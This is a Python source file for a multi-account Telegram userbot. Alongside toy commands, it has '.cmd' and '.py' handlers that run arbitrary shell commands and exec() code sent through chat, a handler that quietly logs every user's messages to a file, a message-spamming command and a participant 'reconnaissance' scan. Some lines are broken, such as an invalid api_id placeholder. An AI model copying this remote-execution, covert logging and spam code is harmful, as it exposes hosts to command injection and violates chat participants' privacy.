from telethon import client,TelegramClient,events
import asyncio
from datetime import datetime
import io,os,sys
import random
import platform
import psutil
import socket
import subprocess
import wikipedia

api_id = your api
api_hash = 'your hash'

MY_ID = 8219880204

SESSIONS_DIR = 'file_sessions'

wikipedia.set_lang("en")

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)
    print(f"--- Создана папка: {SESSIONS_DIR} ---")

async def wiki_handler(event):
    user = event.pattern_match.group(1)
    await event.edit("`SEARCH IN WIKI`")
    
    try:
        result = wikipedia.summary(user,sentences=2)
    except:
        return await event.edit("`NOT A FIND`")
    
    await event.edit(result)

async def split_handler(event):
    text = event.pattern_match.group(1)
    delay = 0.3 

    if not text:
        await event.edit("`[!] INPUT TEXT FOR .split`")
        return

    words = text.split()

    if len(words) < 2:
        await event.edit("`[!] THIS IS SMALL TEXT`")
        return

    await event.delete()

    for word in words:
        await event.client.send_message(event.chat_id, word)
        await asyncio.sleep(delay)

async def calc_handler(event):
    text = event.text.split(maxsplit=1)[1]
    await event.edit("`📚DOING A EXAMPLE`")
    if "+" in text:
        op = "+"
    elif "-" in text:
        op = "-"
    elif "*" in text:
        op = "*"
    elif "/" in text:
        op = "/"
    else:
        return await event.edit("`❌ERROR:OP NOT FOUND`")
    
    
    parts = text.split(op)
    num1 = float(parts[0])
    num2 = float(parts[1])
    if op == "+":
        result = num1 + num2
    elif op == "-":
        result = num1 - num2
    elif op == "*":
        result = num1 * num2
    elif op =="/":
        if num2 == 0:
            return await event.edit("`❌ ERROR: DIVISION BY ZERO`")
        result = num1/num2
    await event.edit(f"`{num1} {op} {num2} = {result}`")


(events.NewMessage(pattern=r'\.dice$',outgoing=True))
async def dice_handler(event):
    await event.edit("```🎲THROW A CUBE```")
    await asyncio.sleep(0.5)
    vibor = random.randint(1,7)
    await event.edit(f"`FELL: {vibor}`")

    
async def scan_handler(event):
    await event.edit("`SCANNING A CHAT`")
    users = await event.client.get_participants(event.chat_id,limit=100)
    info = "[RECONNAISSANCE]\n"
    for user in users:
        info +=f"[{user.id}] {user.first_name}\n"
    await event.edit(f"```{info}\n```")
    
async def bash_handler(event):
    if event.sender_id != MY_ID:
        return
    try:
       command = event.text.split(maxsplit=1)[1]
    except IndexError:
        return await event.edit("`[!]System: NO COMMAND PROVIDED`")
 
    await event.edit("`>_ EXECUTING...`")
    try:
        result = subprocess.check_output(command,shell=True,stderr=subprocess.STDOUT)
        output = result.decode('cp866')
    except subprocess.CalledProcessError as e:
        output = e.output.decode('cp866')
    except Exception as e:
        output = str(e)
    if not output.strip():
        output = "`DONE(NO OUTPUT)`"
    menu = (
    f"```\n"
    f"[>_] COMMAND:\n"
    f"{command}\n"
    f"[#] OUTPUT:\n"
    f"{output}\n"
    f"```"
    )

    await event.edit(menu)

async def cmd_handler(event):
    if event.sender_id != MY_ID:
        return
    try:
        code = event.text.split(maxsplit = 1 ) [1]
    except IndexError:
        await event.edit("`📛NEED A CODE`")

    old_stdout = sys.stdout
    new_stdout = io.StringIO()
    sys.stdout = new_stdout
    try:
        exec(code)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sys.stdout = old_stdout
    result = new_stdout.getvalue()
    if not result:
        result = "Success (no output)"
    await event.edit(f"**📃Code:**\n`{code}`\n\n**📦 Conclusion:**\n`{result}`")

async def sys_handler(event):
    os = platform.system()
    pc = socket.gethostname()
    proc = platform.processor()
    ram = psutil.virtual_memory().percent
    sys = (
        "```"
        f"|📓OS: {os}\n"
        f"|💻PC NAME: {pc}\n"
        f"|💿PROCESSOR: {proc}\n"
        f"|💾RAM USAGE: {ram}"
        "```"
        )
    await event.edit(sys)

async def info_handler(event):
    await event.edit("👁Получаю информацию о пользователе...")

    try:
        reply = await event.get_reply_message()
        if reply:
            user = await reply.get_sender()
        else:
            target = event.pattern_match.group(1)
            user = await event.client.get_entity(event.pattern_match.group(1))
    except Exception:
        return await event.edit("`❌NEED A REPLY OR USER!!!`")

    uid = user.id
    first_name = user.first_name
    username = f"@{user.username}" if user.username else "None"
 
    await asyncio.sleep(1.2)
    await event.edit(f"`|🔎ID USER:{uid}`\n"
                     f"`|👤NAME:{first_name}`\n"
                     f"`|📑USERNAME:{username}`\n"
                    )

async def clock_handler(event):
    for i in range(30):
        cl = datetime.now().strftime("%H:%M:%S")
        clock_text =    (
                        f"```\n"
                        f"┌──────────┐\n"
                        f"| {cl}   |\n"
                        f"└──────────┘\n" 
                        f"```"
        )               
        await event.edit(clock_text)
        await asyncio.sleep(1)

async def flip_handler(event):
    flip = ("🦅 Орёл","🪙 Решка")
    await event.edit("`✨ Бросаю монету`")
    await asyncio.sleep(1)
    result = random.choice(flip)
    await event.edit(f"`{result}`")

async def matrix_handler(event):
    matrix = ["R","U","S","C","M","I"]
    for i in range(20):
        content = "\n".join("".join(random.choice(matrix) for _ in range(40)) for _ in range(24))

        await event.edit(f"```\n{content}\n```")
        await asyncio.sleep(0.15)

async def help_handler(event):
    help = (
        "```\n"
        "⎡───────────────╼\n"
        "⎢    COMMANDS CMIUB\n"
        "⎣───────────────╼\n"
        "╭── 🛠 MAIN\n"
        "│  `.info`  — information a user\n"
        "│  `.ping`  — speed userbot\n"
        "│  `.help`  — show this menu\n"
        "│  `.matrix` — animation symbol\n"
        "│  `.clock`  — animation clock\n"
        "│  `.flip`  —  flip a coin\n"
        "│  `.sys`  —  info a host\n"
        "│  `.py`  —  python in client\n"
        "│  `.cmd`  —  terminal in client\n"
        "│  `.scan`  — scan a chat \n"
        "│  `.dice`  —  throw a cube\n"
        "│  `.split`  — split a text  \n"
        "│  `.calc`  — calculator  \n"
        "│  `.wiki`  — stupid wikipedia \n"
        "╰──`.spam`   — spam a message\n"
        "```"        
    )
    await event.edit(help)

async def spam_handler(event):
    args = event.text.split(maxsplit=3)
    if len(args) < 4:
        return await event.edit("`🤬DONT HAVE A TEXT`")
    count = int(args[1])
    lat = float(args[2])
    text = args[3]
    if count > 100:
        return await event.edit("`❌TOO MANY COUNT 100 - MAX`")
    if lat < 0.2:
        return await event.edit("`‼TOO MANY LATENCY 0.2 - MAX`")
    await event.delete()
    for i in range(count):
        await event.client.send_message(event.chat_id, text)
        await asyncio.sleep(lat)

async def ping_handler(event):
    start = datetime.now()
    await event.edit("`Ping.....`")
    end = datetime.now()
    dur =(end - start).total_seconds()*1000
    await event.edit(f"` Pong! | {round(dur, 2)}ms`")
        
async def monitor_handler(event):
    chat = await event.get_input_chat()
    user = event.sender_id
    now = datetime.now().strftime("%H:%M:%S")
    log_entry = f"| Время: {now} | Отправитель:{event.sender_id} | Чат: {event.chat_id} | Cообщение: {event.text}"   
    with open("logscmi.txt","a",encoding="utf-8") as f:
        f.write(f"| Время: {now} | Отправитель:{event.sender_id} | Чат: {event.chat_id} | Cообщение: {event.text}")
    print(log_entry.strip())

async def register_sessions(api_id,api_hash):
    clients = []
    while True:
        name = input("Введите название новой сессии или stop для выхода: ")
        if name == "stop" : break
        session_path = os.path.join(SESSIONS_DIR, name)
        client = TelegramClient(session_path,api_id,api_hash)
        await client.start()
        print(f"Успешно! Сессия сохранена в {session_path}.session")
        await client.disconnect()

async def start_all_clients(api_id,api_hash):
    all_clients = []
    if not os.listdir(SESSIONS_DIR):
        print(f"В папке {SESSIONS_DIR} пусто...")
        return
    for file in os.listdir(SESSIONS_DIR):
        if file.endswith(".session"):
            name = file.replace(".session","")
            session_path = os.path.join(SESSIONS_DIR, name)
            print(f"Попытка запустить сессию: {name}")
            client = TelegramClient(session_path,api_id,api_hash)
            client.add_event_handler(monitor_handler, events.NewMessage)
            client.add_event_handler(info_handler,events.NewMessage(pattern=r'\.info\s*(.*)$', outgoing=True))
            client.add_event_handler(ping_handler,events.NewMessage(pattern=r'\.ping$',outgoing=True))
            client.add_event_handler(clock_handler,events.NewMessage(pattern=r'\.clock$',outgoing=True))
            client.add_event_handler(spam_handler,events.NewMessage(pattern=r'\.spam',outgoing=True))
            client.add_event_handler(matrix_handler,events.NewMessage(pattern=r'\.matrix$',outgoing=True))
            client.add_event_handler(help_handler,events.NewMessage(pattern=r'\.help$',outgoing=True))
            client.add_event_handler(flip_handler,events.NewMessage(pattern=r'\.flip$',outgoing=True))
            client.add_event_handler(sys_handler,events.NewMessage(pattern=r'\.sys$',outgoing=True))
            client.add_event_handler(cmd_handler,events.NewMessage(pattern=r'\.py'))
            client.add_event_handler(bash_handler,events.NewMessage(pattern=r'\.cmd'))
            client.add_event_handler(scan_handler,events.NewMessage(pattern=r'\.scan$',outgoing=True))
            client.add_event_handler(dice_handler,events.NewMessage(pattern=r'\.dice$',outgoing=True))
            client.add_event_handler(calc_handler,events.NewMessage(pattern=r'\.calc',outgoing=True))
            client.add_event_handler(split_handler,events.NewMessage(pattern=r'\.split (.*)', outgoing=True))
            client.add_event_handler(wiki_handler,events.NewMessage(pattern=r'\.wiki (.*)',outgoing=True))
            all_clients.append(client)

    if all_clients:
        print(f"Запущено аккаунтов:{len(all_clients)}")
        for client in all_clients:
            print(f"Запуск: {client.session.filename}")
            await client.start()
        print("ЮЗЕРБОТ БЫЛ ЗАПУЩЕН НА ВСЕХ АККАУНТАХ")
        await asyncio.gather(*(c.run_until_disconnected() for c in all_clients))

async def main():
    print("""
     ██╗ ██████╗███╗   ███╗██╗██╗   ██╗██████╗ 
     ██║██╔════╝████╗ ████║██║██║   ██║██╔══██╗
     ██║██║     ██╔████╔██║██║██║   ██║██████╔╝
     ╚═╝██║     ██║╚██╔╝██║██║██║   ██║██╔══██╗
     ██╗╚██████╗██║ ╚═╝ ██║██║╚██████╔╝██████╔╝
     ╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═════╝ v1.1

     """)
    print("____________________")
    print("|                  |")                   
    print("| 1.Создание сессий|")
    print("| -_-_-_-_-_-_-_-_-|")
    print("|2.Запуск хендлеров|")
    print("|__________________|")
    print("---BY T.ME/RUSCMI---")
    choice = input("Выбери действие: ")
    
    if choice == "1":
        await register_sessions(api_id,api_hash)
    elif choice == "2":
        await start_all_clients(api_id,api_hash)

if __name__ == "__main__":
    asyncio.run(main())
